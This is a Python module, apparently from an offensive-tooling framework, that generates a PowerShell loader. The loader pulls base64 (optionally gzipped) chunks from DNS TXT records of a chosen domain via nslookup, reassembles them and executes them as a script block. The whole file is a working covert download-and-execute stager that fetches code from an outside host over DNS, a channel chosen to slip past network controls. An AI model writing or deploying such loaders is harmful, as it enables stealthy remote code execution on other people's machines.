from lets.__module__ import Module


class DNSLoader(Module):
    """
    Generate a PowerShell script that executes further PowerShell code
    from a stream of DNS TXT records (modified PowerDNS).
    """

    @classmethod
    def add_arguments(self, parser):
        parser.add_argument("domain", type=str,
            help="domain name")
        parser.add_argument("-a", "--address", type=str,
            help="address of domain server")
        parser.add_argument("-z", "--decompress", action="store_true",
            help="payload is gzipped")

    def handle(self, input, domain, address=None, decompress=False):

        def lookup(n):
            s = "nslookup -type=TXT -retry=3 -timeout=6 %s.%s" % (n, domain)
            if address:
                s += " %s" % address
            return s

        powerdns  = "for ($i=1;$i -le $(iex \"%s\")[-1].Trim().Replace('\"',''); $i++) {" % lookup(0)
        powerdns +=     "$(iex \""
        powerdns +=         lookup("$i")
        powerdns +=     "\")[-1].Trim().Replace('\"','');"
        powerdns += "}"

        if decompress:
            cmd  =  "&([ScriptBlock]::Create("
            cmd +=      "(New-Object System.IO.StreamReader("
            cmd +=          "New-Object System.IO.Compression.GzipStream("
            cmd +=              "(New-Object System.IO.MemoryStream(,"
            cmd +=                  "[System.Convert]::FromBase64String("
            cmd +=                      "$(%s)" % powerdns
            cmd +=                  ")"
            cmd +=              ")),[System.IO.Compression.CompressionMode]::Decompress"
            cmd +=          ")"
            cmd +=      ")).ReadToEnd()"
            cmd +=  "))"

        else:
            cmd  =  "&([ScriptBlock]::Create("
            cmd +=      "[System.Text.Encoding]::Ascii.GetString("
            cmd +=          "[System.Convert]::FromBase64String("
            cmd +=              "$(%s)" % powerdns
            cmd +=          ")"
            cmd +=      ")"
            cmd +=  "))"
        
        yield cmd.encode()
